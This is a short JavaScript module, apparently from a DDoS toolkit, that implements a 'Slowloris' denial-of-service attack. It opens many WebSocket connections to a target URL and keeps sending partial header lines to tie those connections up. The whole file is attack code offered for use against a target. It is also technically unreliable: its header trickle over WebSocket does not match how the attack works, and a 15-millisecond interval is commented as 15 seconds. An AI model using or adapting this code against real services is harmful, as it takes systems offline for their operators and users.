// main/ddos/slowloris.js
// Slowloris attack implementation

function slowloris(target, numSockets) {
  if (!target) {
    console.error("Target URL is required for Slowloris attack.");
    return;
  }

  if (!numSockets || numSockets <= 0) {
    numSockets = 100; // Default number of sockets
  }

  console.log(`Initiating Slowloris attack against ${target} using ${numSockets} sockets.`);

  for (let i = 0; i < numSockets; i++) {
    try {
      const socket = new WebSocket(target); // Use WebSocket for persistent connection

      socket.onopen = () => {
        console.log(`Socket ${i + 1} opened.`);
        sendPartialHeader(socket);
        setInterval(() => {
          sendPartialHeader(socket);
        }, 15); // Send partial header every 15 seconds to keep connection alive
      };

      socket.onclose = () => {
        console.log(`Socket ${i + 1} closed.`);
      };

      socket.onerror = (error) => {
        console.error(`Socket ${i + 1} error: ${error}`);
      };
    } catch (error) {
      console.error(`Failed to create socket ${i + 1}: ${error}`);
    }
  }

  function sendPartialHeader(socket) {
    const partialHeader = "X-Custom-Header: keep-alive\r\n"; // Modified header
    try {
      socket.send(partialHeader);
      // console.log("Partial header sent."); // Keep it quiet
    } catch (error) {
      console.error("Error sending partial header:", error);
      socket.close();
    }
  }
}

export { slowloris };